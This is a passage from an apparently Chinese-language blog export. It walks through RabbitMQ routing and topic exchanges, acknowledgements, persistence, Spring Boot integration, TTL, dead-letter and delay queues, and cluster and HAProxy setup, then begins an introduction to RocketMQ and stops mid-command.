channel.basicPublish(RabbitConstant.EXCHANGE_WEATHER_ROUTING,me.getKey() , null , me.getValue().getBytes());        &#125;        channel.close();        connection.close();    &#125;&#125;\n\n消费者：\npublic class Sina &#123;    public static void main(String[] args) throws IOException &#123;        //获取TCP长连接        Connection connection = RabbitUtils.getConnection();        //获取虚拟连接        final Channel channel = connection.createChannel();        //声明队列信息        channel.queueDeclare(RabbitConstant.QUEUE_SINA, false, false, false, null);        //指定队列与交换机以及routing key之间的关系        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, &quot;us.cal.lsj.20201127&quot;);        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, &quot;china.hubei.wuhan.20201127&quot;);        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, &quot;us.cal.lsj.20201128&quot;);        channel.queueBind(RabbitConstant.QUEUE_SINA, RabbitConstant.EXCHANGE_WEATHER_ROUTING, &quot;china.henan.zhengzhou.20201012&quot;);        channel.basicQos(1);        channel.basicConsume(RabbitConstant.QUEUE_SINA , false , new DefaultConsumer(channel)&#123;            @Override            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                System.out.println(&quot;新浪天气收到气象信息：&quot; + new String(body));                channel.basicAck(envelope.getDeliveryTag() , false);            &#125;        &#125;);    &#125;&#125;\n\n看得出来，具体的差别仅仅在于是否在绑定的时候添加routingKey。\nTopicsTopics工作模式需要指定交换机的类型为topic，与Direct相比，都是可以根据rourtingKey把消息路由到不同的队列。只不过Topic类型的交换机可以让队列在绑定routingKey 的时候使用通配符！\nroutingKey一般都是有一个或多个单词组成，多个单词之间以.分割，例如： msg.qq\n通配符规则：\n\n#：匹配零个、一个或多个词\n*：匹配不多不少恰好1个词\n\n举例：\n\nmsg.#：能够匹配msg.qq.friend 或者 msg.qq\nmsg.*：只能匹配msg.qq\n\n生产者发送消息：\npublic class Send &#123;    private final static String EXCHANGE_NAME = &quot;topic_exchange_test&quot;;    public static void main(String[] argv) throws Exception &#123;        // 获取连接        Connection connection = ConnectionUtil.getConnection();        // 获取通道        Channel channel = connection.createChannel();        // 声明exchange，指定类型为topic        channel.exchangeDeclare(EXCHANGE_NAME, &quot;topic&quot;);        // 消息内容1        String message1 = &quot;发送QQ消息&quot;;        // 发送消息，并且指定routingKey为&#x27;msg.qq&#x27;        channel.basicPublish(EXCHANGE_NAME, &quot;msg.qq&quot;, null, message1.getBytes());        System.out.println(&quot; [生产者] 发送消息1：&quot; + message1);                // 消息内容2        String message2 = &quot;发送wechat消息&quot;;        // 发送消息，并且指定routingKey为&#x27;msg.wechat&#x27;        channel.basicPublish(EXCHANGE_NAME, &quot;msg.wechat&quot;, null, message2.getBytes());        System.out.println(&quot; [生产者] 发送消息2：&quot; + message2);        // 关闭连接        channel.close();        connection.close();    &#125;&#125;\n\n代码中发送了两个消息，routingKey分别为msg.qq和msg.wechat。\n消费者接收消息\n消费者1\npublic class Recv &#123;    private final static String QUEUE_NAME = &quot;topic_exchange_queue_1&quot;;    private final static String EXCHANGE_NAME = &quot;topic_exchange_test&quot;;    public static void main(String[] argv) throws Exception &#123;        // 获取连接        Connection connection = ConnectionUtil.getConnection();        // 获取通道        Channel channel = connection.createChannel();        // 声明队列        channel.queueDeclare(QUEUE_NAME, false, false, false, null);        // 绑定队列到交换机，同时指定需要订阅的routingKey为&#x27;msg.qq&#x27;        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;msg.qq&quot;);        // 定义队列的消费者        DefaultConsumer consumer = new DefaultConsumer(channel) &#123;        @Override        public void handleDelivery(String consumerTag,                                    Envelope envelope,                                    BasicProperties properties,                                   byte[] body) throws IOException &#123;                // 获取消息                String msg = new String(body);                System.out.println(&quot; [消费者1] 接收消息 : &quot; + msg + &quot;!&quot;);            &#125;        &#125;;        // 监听队列        channel.basicConsume(QUEUE_NAME, true, consumer);    &#125;&#125;\n\n消费者1队列的routingKey为msg.qq。\n消费者2\npublic class Recv2 &#123;    private final static String QUEUE_NAME = &quot;topic_exchange_queue_2&quot;;    private final static String EXCHANGE_NAME = &quot;topic_exchange_test&quot;;    public static void main(String[] argv) throws Exception &#123;        // 获取连接        Connection connection = ConnectionUtil.getConnection();        // 获取通道        Channel channel = connection.createChannel();        // 声明队列        channel.queueDeclare(QUEUE_NAME, false, false, false, null);        // 绑定队列到交换机，同时指定需要订阅的routingKey为&#x27;msg.*&#x27;        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, &quot;msg.*&quot;);        // 定义队列的消费者        DefaultConsumer consumer = new DefaultConsumer(channel) &#123;        @Override        public void handleDelivery(String consumerTag,                                   Envelope envelope,                                    BasicProperties properties,                                   byte[] body) throws IOException &#123;                // 获取消息                String msg = new String(body);                System.out.println(&quot; [消费者2] receive: &quot; + msg + &quot;!&quot;);            &#125;        &#125;;        // 监听队列        channel.basicConsume(QUEUE_NAME, true, consumer);    &#125;&#125;\n\n消费者2队列的routingKey为msg.*。\n消息确认机制(ACK)通过刚才的案例可以看出，消息一旦被消费者接收，队列中的消息就会被删除。那么问题来了：RabbitMQ怎么知道消息被接收了呢？如果消费者领取消息后，程序抛出了异常呢？那么会造成消息消费失败，但是RabbitMQ无从得知，这样消息就丢失了！这就需要依赖RabbitMQ的ACK机制。\n生产者ACK对于生产者来说，RabbitMQ提供了监听器（Listener）来接收消息投递的状态，消息确认涉及两种状态：\n\nConfirm：代表生产者将消息发送到Broker时的状态，会出现两种情况：\nack：代表Broker成功接收消息。\nnack：代表Broker由于某些原因拒绝接收消息。【队列满了、限流、异常\n\n\nReturn：代表生产者将消息发送到RabbitMQ成功，但是消息投递时由于没有设有对应的队列，而将消息回退给生产者。\n\n通过如下代码可以监听生产者消息投递的Confirm状态：\n// 开启监听模式channel.confirmSelect();// 添加confirm监听器channel.addConfirmListener(new ConfirmListener() &#123;    /** 处理ack，表示消息被mq接收      * param1：消息标签id      * param2：代表接收的数据是否为批量接收，一般用不到 \t */    @Override    public void handleAck(long deliveryTag, boolean multiple) throws IOException &#123;    &#125;    // 处理nack，表示消息未被mq接收    @Override    public void handleNack(long deliveryTag, boolean multiple) throws IOException &#123;    &#125;&#125;);\n\n通过如下代码可以监听生产者消息投递的Return状态：\n// 开启监听模式channel.confirmSelect();// 添加return监听器channel.addReturnListener(new ReturnCallback() &#123;    @Override    // returnMessage包含了发送结果、交换机、routingKey、消息体等信息    public void handle(Return returnMessage) &#123;            &#125;&#125;);\n\n消费者ACK上面的情况仅针对生产者与RabbitMQ之间消息传递的状态。而当消费者获取消息后，会向RabbitMQ发送回执ACK，告知消息已经被接收。不过这种回执ACK分两种情况：\n\n自动ACK：消息一旦被接收，消费者自动发送ACK。\n手动ACK：消息接收后，不会发送ACK，需要手动调用。\n\n那么哪种更好呢？这需要看消息的重要性：\n\n如果消息不太重要，丢失也没有影响，那么自动ACK会比较方便。\n如果消息非常重要，不容丢失。那么最好在消费完成后手动ACK，否则接收消息后就自动ACK，RabbitMQ就会把消息从队列中删除。如果此时消费者宕机，那么消息就丢失了。\n\n在之前的程序中我们使用的是自动ACK，如果要使用手动ACK需要修改下列代码：\n\n修改监听队列的basicConsume方法的第二个参数\nchannel.basicConsume(QUEUE_NAME, false, consumer);\n\n在消费者comsumer的回调方法handleDelivery结尾添加手动ACK\n// 第一个参数为消息标签id，可以从envelope中获取// 第二个参数false表示只ack当前消费者的消息，true表示批量ack之前未ack的消息channel.basicAck(deliveryTag, false);\n\n这样修改后，如果程序出现异常，则不会执行最后的手动ACK，那么消息仍然保存在队列中，解决了问题。\n换句话说，当我们回复确认ACK时，消息就会在队列中删除掉。\n持久化之前向大家介绍了消息确认机制(ACK)，它是避免消息丢失的方法之一。实际上，持久化才是真正能够有效避免消息丢失的解决方案：\n\n交换机持久化\nchannel.exchangeDeclare(EXCHANGE_NAME, &quot;topic&quot;, true);\n\n在创建交换机时加入第三个参数，并设置为true，表示交换机持久化。\n\n队列持久化\nchannel.queueDeclare(QUEUE_NAME, true, false, false, null);\n\n在创建队列时将第二个参数设置为true，表示队列持久化。\n\n消息持久化\nchannel.basicPublish(EXCHANGE_NAME, &quot;msg.wechat&quot;, MessageProperties.PERSISTENT_TEXT_PLAIN, message2.getBytes());\n\n在发送消息时将第三个参数设置为MessageProperties.PERSISTENT_TEXT_PLAIN，表示消息持久化。\n\n\nSpring Boot整合RabbitMQSpring AMQPSpring-amqp是对AMQP协议的抽象实现，而 spring-rabbit 是对协议的具体实现，也是目前的唯一实现。底层使用的就是RabbitMQ。本文只为大家简单介绍，具体可以参考官方教程：https://docs.spring.io/spring-amqp/docs/2.2.7.RELEASE/reference/html/\n导入依赖及配置&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;&lt;/dependency&gt;\n\n配置文件\nspring:  rabbitmq:    host: 127.0.0.1     username: liduaon    password: liduoan    port: 5672    virtual-host: /liduoan_demo    # 生产者    template:    # exchange: spring.test.exchange      retry:        enabled: true        initial-interval: 1000        max-interval: 2000        multiplier: 2        max-attempts: 1    # 消费者    listener:      simple:        acknowledge-mode: manual        concurrency: 1        max-concurrency: 10        retry:          enabled: true          max-attempts: 1 # 最大重试次数           initial-interval: 1000 # 第一次重试的间隔时长          multiplier: 2 # 下次重试间隔的倍数          max-interval: 2000  # 最长重试间隔    publisher-confirms: true\n\n常用参数说明（完整配置请参考官方文档）：\n\ntemplate：有关\n的配置\n\nexchange：缺省的交换机名称，此处配置后，发送消息如果不指定交换机就会使用这个\nretry：失败重试\nenabled：开启失败重试\ninitial-interval：第一次重试的间隔时长\nmax-interval：最长重试间隔，超过这个间隔将不再重试\nmultiplier：下次重试间隔的倍数，此处是2即下次重试间隔是上次的2倍\nmax-attempts：最大重试次数\n\n\n\n\nlistener：有关消费者监听器的配置\n\nsimple：\nacknowledge-mode：消息确认方式，取值包括none、manual和auto(默认auto)\nconcurrency：最小的消费者数量\nmax-concurrency：最大的消费者数量\nretry：配置消费者重试参数，和生产者一致\n\n\n\n\npublisher-confirms：生产者确认机制，确保消息会正确发送，如果发送失败会有错误回执，从而触发重试\n\n\n配置类/** * @description: * @author: Liduoan * @time: 2021/6/10 */@Configurationpublic class MQConfig &#123;        //声明队列    @Bean    public Queue directQ1() &#123;        return new Queue(&quot;direct_sb_mq_q1&quot;);    &#125;    @Bean    public Queue directQ2() &#123;        return new Queue(&quot;direct_sb_mq_q2&quot;);    &#125;    //声明exchange    @Bean    public DirectExchange setDirectExchange() &#123;        return new DirectExchange(&quot;directExchange&quot;);    &#125;    //声明binding，需要声明一个routingKey    @Bean    public Binding bindDirectBind1() &#123;        //后面的with里是routingKey        return BindingBuilder.bind(directQ1()).to(setDirectExchange()).with(&quot;china.changsha&quot;);    &#125;        @Bean    public Binding bindDirectBind2() &#123;        return BindingBuilder.bind(directQ2()).to(setDirectExchange()).with(&quot;china.beijing&quot;);    &#125;&#125;\n\n生产者/** * @description: * @author: Liduoan * @time: 2021/6/10 */@RestControllerpublic class mqController &#123;    @Autowired    private RabbitTemplate rabbitTemplate;    @GetMapping(&quot;/liduoan&quot;)    public String testMq()&#123;        String message = &quot;Rabbit Mq okkkk&quot;;        //发送消息，具体参数可以看提示        //第一个参数为交换机名  第二个为routingKey 第三个为消息        rabbitTemplate.send(&quot;directExchange&quot;,&quot;china.changsha&quot;,new Message(message.getBytes()));        return &quot;ok&quot;;    &#125;&#125;\n\n消费者/** * @description: * @author: Liduoan * @time: 2021/6/10 */@Componentpublic class ConsumerMQ &#123;\t//标识监听哪个队列 当队列中存有消息时，进行获取消息    @RabbitListener(queues=&quot;direct_sb_mq_q1&quot;)    public void helloWorldReceive(Message message) &#123;        System.out.println(&quot;helloWorld模式 received message : &quot; +message);    &#125;&#125;\n\n\n简单的整合就如上图，消费者通过使用注解进行监听，而生产者调用RabbitTemplate进行发送消息。\n生产端直接注入RabbitTemplate完成消息发送\n消费端直接使用@RabbitListener完成消息接收\n另外记得开放5672端口，我就是机器没开端口一直超时—。\n多线程处理消息代码中使用@RabbitListener注解指定消费方法，默认情况是单线程监听队列，可以观察当队列有多个任务时消费端每次只消费一个消息，单线程处理消息容易引起消息处理缓慢，消息堆积，不能最大利用硬件资源。\n这里大家可能先到了之前的Work Queues模式，即同一个队列由多个消费者监听，共同处理队列中的任务。这样的确可以解决消息堆积的问题，但是如果手动配置很多消费者的话会很麻烦。Spring AMQP为我们提供了一个解决方案：\n可以配置mq的容器工厂，增加参数中的并发处理数量即可实现多线程处理监听队列，实现多线程处理消息。\n\n在配置类中配置mq容器工厂\n@Configurationpublic class RabbitmqConfig &#123;    // 消费者并发数量    public static final int DEFAULT_CONCURRENT = 10;    // 省略若干配置......        // 配置容器工厂    @Bean(&quot;customContainerFactory&quot;)    public SimpleRabbitListenerContainerFactory containerFactory(                 SimpleRabbitListenerContainerFactoryConfigurer configurer,                 ConnectionFactory connectionFactory) &#123;        SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory();        factory.setConcurrentConsumers(DEFAULT_CONCURRENT);        factory.setMaxConcurrentConsumers(DEFAULT_CONCURRENT);        configurer.configure(factory, connectionFactory);        return factory;    &#125;&#125;\n\n@RabbitListener注解中指定容器工厂\n@Componentpublic class Listener &#123;\t//queues = &quot;direct_sb_mq_q1&quot;    @RabbitListener(queues = &quot;$&#123;mq.queue-name&#125;&quot;,                    containerFactory = &quot;customContainerFactory&quot;)    public void listen(String msg)&#123;        System.out.println(&quot;接收到消息：&quot; + msg);    &#125;&#125;\n\n消息可靠性RabbitMQ提供了事务机制可以有效保证消息的可靠性，但是官方并不推荐使用，因为会导致RabbitMQ的性能下降250倍左右。\n生产者ACK监听生产者消息投递的Confirm状态的方式如下：\n\n首先必须在配置文件中配置下面的值为true：\n\nspring:  rabbitmq:    publisher-confirms: true\n\n\n接着在RabbitTemplate对象中添加Confirm状态的监听器：\n\n/** * param1:相关配置信息 * param2:exchange是否成功接收到消息 * param3:失败原因 *///在生产者发送消息之前调用就行rabbitTemplate.setConfirmCallback((correlationData, ack, cause) -&gt; &#123;    if (ack) &#123;        System.out.println(&quot;成功！&quot;);    &#125; else &#123;        System.out.println(&quot;失败！&quot; + cause);    &#125;&#125;);\n\n监听生产者消息投递的Return状态的方式如下：\n\n首先在配置文件中配置下面的值为true：\n\nspring:  rabbitmq:    publisher-returns: true    # 该配置同publisher-returns    template:      mandatory: true\n\n\n或者在RabbitTemplate对象中设置mandatory为true：\n\n// 设置mandatory为truerabbitTemplate.setMandatory(true);\n\n\n接着在RabbitTemplate对象中添加Return状态的监听器：\n\n/**添加Confirm状态的监听器 * param1:消息对象 * param2:错误码 * param3:错误信息 * param4:交换机 * param5:routingKey */rabbitTemplate.setReturnCallback((message, replyCode, replyText, exchange, routingKey) -&gt; &#123;    System.out.println(replyCode);&#125;);\n\n假如不存在routingKey对应的队列，那么消息就无法找到队列，则会调用Confirm状态的监听器。\n消费者ACKRabbitMQ默认是自动ACK的，需要在配置文件中配置进行配置开启消费者手动ACK：\nspring:  rabbitmq:    listener:      simple:        acknowledge-mode: manual\n\n由于消费者ACK需要调用Channel的相关API，因此需要在监听方法中添加Channel参数（会自动注入）：\n@RabbitListener(queues = &quot;test_queue&quot;)public void listen(Message msg, Channel channel) &#123;    // 获取消息标签id    long deliveryTag = msg.getMessageProperties().getDeliveryTag();    try &#123;        System.out.println(&quot;接收到消息：&quot; + msg.getBody());        /** ACK表示消息消费成功          * param1：消息标签id          * param2：代表接收的数据是否为批量接收，一般用不到 \t      */        channel.basicAck(deliveryTag, false);    &#125; catch (IOException e) &#123;        e.printStackTrace();        try &#123;          /** NACK表示消息消费异常          * param1：消息标签id          * param2：代表接收的数据是否为批量接收，一般用不到          * param3：表示是否将消息返回队列中，设置为false的话消息就会被丢弃 \t      */            channel.basicNack(deliveryTag, false, true);        &#125; catch (IOException ex) &#123;            ex.printStackTrace();        &#125;    &#125;&#125;\n\n消费者对消息进行确认，那么RabbitMq存储系统将决定是否删除消息。\n而消费者没有确认，也就是channel.basicNack(deliveryTag, false, true);，那么会根据回发的信息进行判断直接删除还是重新发送。\n而没有确认代码的时候，会发生什么呢？按照老师的说法，是会接收不到确认，那么数据不删除。\n消费端限流之前我们介绍了MQ有流量削峰的作用，那么如何做呢？其实非常简单，只需要一些简单的配置：\nspring:  rabbitmq:    listener:      simple:        acknowledge-mode: manual   # 消费者手动ACK        prefetch: 1   # 指定一个请求能处理多少个消息，如果有事务的话，必须大于等于事务数量\n\n\n必须是手动ACK模式，因为只有手动ACK后才能发送下一条消息。\n配置prefetch=1其实就相当于调用channel.basicQos(1)，每次确认后才接收下一跳信息。\n\nTTLTTL全称Time To Live（存活时间）。在RabbitMQ中，TTL指的是当消息到达存活时间后，如果还没有被消费，会被自动清除。RabbitMQ可以对消息设置过期时间，也可以对整个队列设置过期时间：\n\n对消息设置过期时间\n\n// 创建消息属性对象MessageProperties messageProperties = new MessageProperties();// 设置消息的过期时间(单位：毫秒)messageProperties.setExpiration(&quot;10000&quot;);// 创建消息对象，传入消息体和消息属性Message message = new Message(&quot;test_ttl&quot;.getBytes(), messageProperties);// 通过rabbitTemplate发送消息rabbitTemplate.convertAndSend(exchange_name,routingkey, message);\n\n\n对队列设置过期时间\n\n@Beanpublic Queue TEST_QUEUE() &#123;    // 创建一个map    HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();    // 配置参数x-message-ttl的值为10000ms    // 即指定队列为ttl队列    map.put(&quot;x-message-ttl&quot;, 10000);    // 创建队列的时候传入参数    return new Queue(queueName, true, false, false, map);&#125;\n\n如果是对队列设置过期时间，那么该队列中所有的消息都会根据该过期时间过期。如果消息和队列都设置了过期时间，根据时间短的进行过期。\n死信队列死信队列英文缩写为DLX，即Dead Letter Exchange（在RabbitMQ中又叫死信交换机）。当消息成为Dead message后，可以被重新发送到另一个交换机，这个交换机就是DLX。消息成为死信有三种情况：\n\n队列消息长度到达限制。\n消费者拒接消费消息，并且不把消息重新放入原目标队列。\n原队列存在消息过期设置，消息到达超时时间未被消费。\n\n死信交换机普通的交换机没有区别，配置如下：\n// 指定死信交换机注入时的Bean名称public static final String DLX_EXCHANGE_BEAN_NAME = &quot;DLX_EXCHANGE&quot;;// 死信交换机名称public String dlxExchange = &quot;dlx_exchange&quot;;// 声明死信交换机@Bean(DLX_EXCHANGE_BEAN_NAME)public Exchange DLX_EXCHANGE() &#123;    return ExchangeBuilder.topicExchange(dlxExchange).durable(true).build();&#125;\n\n将队列绑定到死信交换机的方式如下：\n// 声明队列@Bean(QUEUE_BEAN_NAME)public Queue TEST_QUEUE() &#123;    // 创建一个map    HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();    // 通过x-dead-letter-exchange属性指定死信交换机的名称    map.put(&quot;x-dead-letter-exchange&quot;, dlxExchange);    // 通过x-dead-letter-routing-key参数指定与死信交换机绑定的routingKey    map.put(&quot;x-dead-letter-routing-key&quot;, dlxRoutingKey);    return new Queue(queueName, true, false, false, map);&#125;\n\n可以看到队列绑定死信交换机并不是通过Binding的方式，而是通过属性的方式。绑定完毕后，如果该队列中的消息过期，或者超出了队列长度限制，就会被发送到该死信交换机中。\n延时队列在RabbitMQ中并没有提供延时队列的功能，但是通过TTL + 死信交换机可以实现延时队列，如下图所示：\n\n\n生产者发送TTL消息到MQ的某个队列Queue1中，该队列指定了一个死信交换机，并且没有消费者接收该队列中的消息。\nTTL消息过期后，会转移到死信交换机，消费者通过另一个绑定到死信交换机的队列Queue2接收消息，这样就可以实现延时队列的功能。\n\n上面的流程中，对于Queue1来说，DLX是死信交换机；对于Queue2来说，DLX就是普通交换机。代码省略，有一点需要特别注意：\n\nQueue2绑定死信交换机时的routingKey，需要包含Queue1绑定死信交换机时通过x-dead-letter-routing-key属性指定的routingKey，这样Queue2才能接收到死信交换机中来自Queue1的消息。\n\n消费端限流之前我们介绍了MQ有流量削峰的作用，那么如何做呢？其实非常简单，只需要一些简单的配置：\nspring:  rabbitmq:    listener:      simple:        acknowledge-mode: manual   # 消费者手动ACK        prefetch: 1   # 指定一个请求能处理多少个消息，如果有事务的话，必须大于等于事务数量\n\n\n必须是手动ACK模式，因为只有手动ACK后才能发送下一条消息。\n配置prefetch=1其实就相当于调用channel.basicQos(1)，每次确认后才接收下一跳信息。\n\nRabbitMQ集群RabbitMQ集群搭建一般来说，如果只是为了学习RabbitMQ或者验证业务工程的正确性那么在本地环境或者测试环境上使用其单实例部署就可以了，但是出于MQ中间件本身的可靠性、并发性、吞吐量和消息堆积能力等问题的考虑，在生产环境上一般都会考虑使用RabbitMQ的集群方案。\n1.1 集群方案的原理\nRabbitMQ这款消息队列中间件产品本身是基于Erlang编写，Erlang语言天生具备分布式特性（通过同步Erlang集群各节点的cookie来实现）。RabbitMQ本身不需要像ActiveMQ、Kafka那样通过ZooKeeper分别来实现HA方案和保存集群的元数据。\n\n主要参考官方文档：https://www.rabbitmq.com/clustering.html\n配置RabbitMQ在两台不同的服务器上搭建两个RabbitMQ节点：\n# 1.准备两台服务器，修改主机名称分别为为m1和m2hostnamectl set‐hostname m1 hostnamectl set‐hostname m2 # 2.保持两个主机的.erlang.cookie文件一致，可以从其中的一台服务器拷贝至另一台 # 文件位置在/var/lib/rabbitmq/.erlang.cookie# 3.停止m2机器中rabbitmq的服务rabbitmqctl stop_app # 在m2执行如下命令添加节点  # 首先需要在/etc/hosts中配置m1的ip地址，如果不配就要写ip地址rabbitmqctl join_cluster --ram rabbit@m1# 重启rabbitmq的服务rabbitmqctl start_app systemctl restart rabbitmq‐server.service  # 4.查看集群信息 rabbitmqctl cluster_status\n\n配置HAProxyHAProxy提供高可用性、负载均衡以及基于TCP和HTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案,包括Twitter，Reddit，StackOverflow，GitHub在内的多家知名互联网公司在使用。HAProxy实现了一种事件驱动、单一进程模型，此模型支持非常大的并发连接数。\n可以将HAProxy安装在第三台服务器上：\n\n安装与启动\n\n# 1.安装 yum install haproxy # 2.配置haproxy.cfg文件具体参照下文 # 3.启动haproxy systemctl start haproxy # 4.查看haproxy进程状态 systemctl status haproxy.service\n\n\n修改haproxy.cfg配置文件\n\n#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ # Example configuration for a possible web application. See the## full configuration options online. # # http://haproxy.1wt.eu/download/1.4/doc/configuration.txt # #‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ #‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ # Global settings #‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ global # to have these messages end up in /var/log/haproxy.log you will # need to: # # 1) configure syslog to accept network log events. This is done # by adding the &#x27;‐r&#x27; option to the SYSLOGD_OPTIONS in # /etc/sysconfig/syslog # # 2) configure local2 events to go to the /var/log/haproxy.log # file. A line like the following can be added to # /etc/sysconfig/syslog # # local2.* /var/log/haproxy.log # log 127.0.0.1 local2 chroot /var/lib/haproxy pidfile /var/run/haproxy.pid maxconn 4000 user haproxy group haproxy daemon # turn on stats unix socket 36 stats socket /var/lib/haproxy/stats #‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ # common defaults that all the &#x27;listen&#x27; and &#x27;backend&#x27; sections will# use if not designated in their block#‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ defaults mode http log global option httplogoption dontlognull option http‐server‐close option forwardfor except 127.0.0.0/8option redispatchretries 3 timeout http‐request 10s timeout queue 1m timeout connect 10s timeout client 1m timeout server 1m timeout http‐keep‐alive 10s timeout check 10s maxconn 3000 # 对MQ集群进行监听 listen rabbitmq_cluster # 通过5672端口对M1, M2进行映射bind 0.0.0.0:5672 # 记录TCP连接的状态和时间option tcplog # 采用TCP协议mode tcp # 开启TCP的Keep Alive(长连接模式)option clitcpka # haproxy与mq建立连接的超时时间timeout connect 1s # 客户端与haproxy最大空闲时间timeout client 10s # 服务器与haproxy最大空闲时间timeout server 10s # 采用轮询转发消息balance roundrobin# 每5秒发送一次心跳,如连续两次有响应则代表状态良好# 如连续三次没有响应则视为服务故障,该节点将被剔除server node1 192.168.74.77:5672 check inter 5s rise 2 fall 3 server node2 192.168.74.88:5672 check inter 5s rise 2 fall 3 # 开启haproxy监控服务 listen http_front # 监听端口bind 0.0.0.0:1080# 统计页面自动刷新时间30sstats refresh 30s # 统计页面urlstats uri /haproxy_stats# 指定HAproxy访问用户名和密码设置stats auth username:password\n\n","tags":["2021"]},{"title":"RocketMQ","url":"/2021/06/13/2021/RocketMQ-0/","content":"\n\nRocketMQ介绍简介RocketMQ是阿里巴巴2016年MQ中间件，使用Java语言开发，在阿里内部，RocketMQ承接了例如“双11”等高并发场景的消息流转，能够处理万亿级别的消息。\n在RabbitMQ消息队列一文中，我们以及介了MQ是什么，有什么作用和市场上流行的几款MQ产品。RocketMQ以其高吞吐量和优秀的分布式架构而具有独特的优势。\n基本信息RocketMQ主要由 Producer、Broker、Consumer 三部分组成，其中Producer 负责生产消息，Consumer 负责消费消息，Broker 负责存储消息。Broker 在实际部署过程中对应一台服务器，每个 Broker 可以存储多个Topic的消息，每个Topic的消息也可以分片存储于不同的 Broker。Message Queue 用于存储消息的物理地址，每个Topic中的消息地址存储于多个 Message Queue 中。ConsumerGroup 由多个Consumer 实例构成。\nTopic 主题表示一类消息的集合，每个主题包含若干条消息，每条消息只能属于一个主题，是RocketMQ进行消息订阅的基本单位。\n标签（Tag）为消息设置的标志，用于同一主题下区分不同类型的消息。来自同一业务单元的消息，可以根据不同业务目的在同一主题下设置不同标签。\n标签能够有效地保持代码的清晰度和连贯性，并优化RocketMQ提供的查询系统。消费者可以根据Tag实现对不同子主题的不同消费逻辑，实现更好的扩展性。\n代理服务器（Broker Server）消息中转角色，负责存储消息、转发消息。代理服务器在RocketMQ系统中负责接收从生产者发送来的消息并存储、同时为消费者的拉取请求作准备。代理服务器也存储消息相关的元数据，包括消费者组、消费进度偏移和主题和队列消息等。\n名字服务（Name Server）名称服务充当路由消息的提供者。生产者或消费者能够通过名字服务查找各主题相应的Broker IP列表。多个Namesrv实例组成集群，但相互独立，没有信息交换。\n生产者组（Producer Group）同一类Producer的集合，这类Producer发送同一类消息且发送逻辑一致。如果发送的是事物消息且原始生产者在发送之后崩溃，则Broker服务器会联系同一生产者组的其他生产者实例以提交或回溯消费\n消费者组（Consumer Group）同一类Consumer的集合，这类Consumer通常消费同一类消息且消费逻辑一致。消费者组使得在消息消费方面，实现负载均衡和容错的目标变得非常容易。\n要注意的是，消费者组的消费者实例必须订阅完全相同的Topic。RocketMQ 支持两种消息模式：集群消费（Clustering）和广播消费（Broadcasting）。\n架构下图是RocketMQ双主双从（后面会搭建该集群）架构的示意图：\n\n角色介绍：\n\nProducer：消息的发送者\nConsumer：消息接收者\nBroker：暂存和传输消息\nNameServer：管理Broker\nTopic：区分消息的种类；一个发送者可以发送消息给一个或者多个Topic；一个消息的接收者可以订阅一个或者多个Topic消息\nMessage Queue：相当于是Topic的分区；用于并行发送和接收消息\n\n下载与安装本次我们在Linux上安装，由于RocketMQ由Java开发，因此需要提前安装好JDK和Maven。\n下载RocketMQRocketMQ最新版本4.7.1下载地址：\nhttps://www.apache.org/dyn/closer.cgi?path=rocketmq/4.7.1/rocketmq-all-4.7.1-bin-release.zip\n本文使用的版本为4.4.0。\n安装RocketMQ将下载好的RocketMQ解压并放如一个适合文件夹中，本文放在&#x2F;usr&#x2F;local&#x2F;rocketmq4.4.0&#x2F;rocketmq-all-4.4.0-bin-release目录下。进入后有如下三个重要目录：\n\nbin：启动脚本，包括shell脚本和CMD脚本\nconf：实例配置文件 ，包括broker配置文件、logback配置文件等\nlib：依赖jar包，包括Netty、commons-lang、FastJSON等\n\n启动RocketMQ\n启动NameServer\n\n# 启动NameServer后台运行nohup sh bin/mqnamesrv &amp;# 查看启动日志tail -f ~/logs/rocketmqlogs/namesrv.log\n\n\n启动Broker\n\n# 启动Broker指定nameSrver地址，后台运行nohup sh bin/mqbroker -n localhost:9876 &amp;# 查看启动日志tail -f ~/logs/rocketmqlogs/broker.log\n\nRocketMQ默认的虚拟机内存较大，启动Broker如果因为内存不足失败，需要编辑如下两个配置文件，修改JVM内存大小:\n# 编辑runbroker.sh和runserver.sh修改默认JVM大小vi runbroker.shvi 